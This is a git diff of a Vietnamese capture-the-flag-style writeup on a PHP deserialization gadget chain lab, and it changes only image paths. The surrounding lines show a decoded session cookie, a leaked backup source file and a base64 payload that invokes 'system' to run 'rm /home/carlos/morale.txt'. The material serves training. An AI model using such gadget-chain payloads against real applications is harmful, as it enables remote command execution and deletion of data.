@@ -1,12 +1,12 @@
 # Writeup LAB Developing a custom gadget chain for PHP deserialization
-![alt text](image.png)
+![alt text](./HinhAnh/image.png)
 ## Goal
 To solve the lab, delete the morale.txt file from Carlos's home directory.
 ## Khai thác
 Đăng nhập với tư cách người dùng `wiener`
-![alt text](image-1.png)
+![alt text](./HinhAnh/image-1.png)
 Lịch sử HTTP Burp như các thử thách trước thì ở session dính lỗ hổng giải tuần tự hóa không an toàn
-![alt text](image-2.png)
+![alt text](./HinhAnh/image-2.png)
 Giải mã URL Cookie được set:
 ```
 Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2emxrNmc1d21oa3Vucmd1ODFieXY0OHN4bTAydm85biI7fQ==
@@ -17,7 +17,7 @@ O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vzlk6g5wmhku
 ```
 Chúng ta thực hiện recon xung quanh ứng dụng thây được `<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->`
 Thực hiện truy cập `/cgi-bin/libs/CustomTemplate.php~` xem mã nguồn ứng dụng 
-![alt text](image-3.png)
+![alt text](./HinhAnh/image-3.png)
 Thực hiện phân tích chi tiết mã nguồn
 ```php
 <?php
@@ -114,4 +114,4 @@ echo "[+] Base64 Encoded Payload: " . base64_encode($payload) . "\n";
 // [+] Base64 Encoded Payload: TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjM6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo2OiJzeXN0ZW0iO31zOjc6InByb2R1Y3QiO047fQ==
 ```
 Dán cookie vào trình duyệt và gửi yêu cầu POST
-![alt text](image-4.png)
+![alt text](./HinhAnh/image-4.png)
